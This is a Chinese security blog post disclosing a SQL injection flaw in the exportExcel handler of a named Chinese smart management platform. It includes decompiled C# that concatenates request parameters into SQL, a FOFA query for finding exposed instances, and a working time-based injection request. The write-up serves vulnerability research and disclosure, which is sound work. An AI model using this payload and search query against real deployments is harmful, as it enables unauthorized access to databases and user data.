---
title: "银达汇智智慧综合管理平台 ADTag.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/windor-Module-BPCJ-AD_Tag-Controller-ADTag-sqli.html
asset_dir: assets/银达汇智智慧综合管理平台-adtag.ashx-sql注入漏洞
---

# 银达汇智智慧综合管理平台 ADTag.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/2 08:20
* 827浏览
* [0评论](#comment)
* 24分钟阅读

深入探索

数据库

软件

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

福建银达汇智信息科技股份有限公司成立于2009年，位于福建省福州市，是一家以从事软件和信息技术服务业为主的企业。银达汇智智慧综合管理平台 `ADTag.ashx` 存在[SQL注入](https://mrxn.net/tag/SQL注入)漏洞,攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

# fofa语法

> `title="智慧综合管理平台登入"`

# 漏洞分析

深入探索

漏洞修复方案

Web安全书籍

安全研究工具

先看 `Module/BPCJ/AD_Tag/Controller/ADTag.ashx` 或者 `Module/AD/AD_Tag/Controller/ADTag.ashx` （二者代码一致）页面引用的dll

```
<%@ WebHandler Language="C#" CodeBehind="ADTag.ashx.cs" Class="KR.Administrator.Module.Controller.ADTag"  %>
```

再看 `KR.Administrator.Module.Controller.ADTag` 实现逻辑

代码安全审计

其他和之前的[这篇文章](https://mrxn.net/jswz/windor-Module-BPCJ-AD_Tag-Controller-ADTag_Info-sqli.html)分析差不多，不再赘述

[![银达汇智智慧综合管理平台 ADTag.ashx SQL注入漏洞](images/img-001-78ff589bef02.webp)](https://image.mrxn.net/130709c6cabe42a08642622ad5c304fd.webp)

主要看下这里的 `exportExcel` 方法

深入探索

技术文章订阅

安全研究报告

编程语言教程

```
private void exportExcel(HttpContext context)
{
  string condition = " 1=1 ";
  if (!string.IsNullOrEmpty(WRequest.GetString("sTagId")))
    condition += $" and TagId like '%{WRequest.GetString("sTagId")}%'";
  if (!string.IsNullOrEmpty(WRequest.GetString("sTagNo")))
    condition += $" and TagNo like '%{WRequest.GetString("sTagNo")}%'";
  if (!string.IsNullOrEmpty(WRequest.GetString("sTagName")))
    condition += $" and TagName like '%{WRequest.GetString("sTagName")}%'";
  if (!string.IsNullOrEmpty(WRequest.GetString("sRemark")))
    condition += $" and Remark like '%{WRequest.GetString("sRemark")}%'";
  if (!string.IsNullOrEmpty(WRequest.GetString("sUpTagId")))
    condition += $" and UpTagId like '%{WRequest.GetString("sUpTagId")}%'";
  if (!string.IsNullOrEmpty(WRequest.GetString("sInnerTagNo")))
    condition += $" and InnerTagNo like '%{WRequest.GetString("sInnerTagNo")}%'";
  if (!string.IsNullOrEmpty(WRequest.GetString("sorg_idBegin")))
    condition += $" and org_id >= {WRequest.GetString("sorg_idBegin")}";
  if (!string.IsNullOrEmpty(WRequest.GetString("sorg_idEnd")))
    condition += $" and org_id < {WRequest.GetString("sorg_idEnd")}";
  DataTable dataTabelToExcel = this.bll.GetDataTabelToExcel(KR.Controls.RunTime.Global.webSiteConfig.ExportCount, condition);
  if (((InternalDataCollectionBase) dataTabelToExcel.Rows).Count <= 0)
    return;
  SystemHelper.CreateExcel(dataTabelToExcel, "application/x-excel", DateTime.Now.ToString("yyyyMMddHHmmssfff"), context, "导出Excel表");
}
```

`exportExcel`方法中多个用户可控参数(`sTagId`/`sTagNo`/`sTagName`/`sRemark`/`sUpTagId`/`sInnerTagNo`/`sorg_idBegin`/`sorg_idEnd`)直接拼接到SQL语句，未进行任何过滤或参数化处理，攻击者可构造恶意参数执行任意SQL命令，形成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
POST /Module/BPCJ/AD_Tag/Controller/ADTag.ashx HTTP/1.1
Host: windor.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=exportExcel&sTagId='waitfor+delay'0:0:4'--
```

[![银达汇智智慧综合管理平台 ADTag.ashx SQL注入漏洞](images/img-002-17c8ab3b44a4.webp)](https://image.mrxn.net/e73780a713604971a3364dfe980ca2b5.webp)

成功延时 4 秒

漏洞预警服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[银达汇智智慧综合管理平台 ADTag.ashx SQL注入漏洞](https://mrxn.net/jswz/windor-Module-BPCJ-AD_Tag-Controller-ADTag-sqli.html)  
文章链接：<https://mrxn.net/jswz/windor-Module-BPCJ-AD_Tag-Controller-ADTag-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/windor-Module-BPCJ-AD\_Tag-Controller-ADTag-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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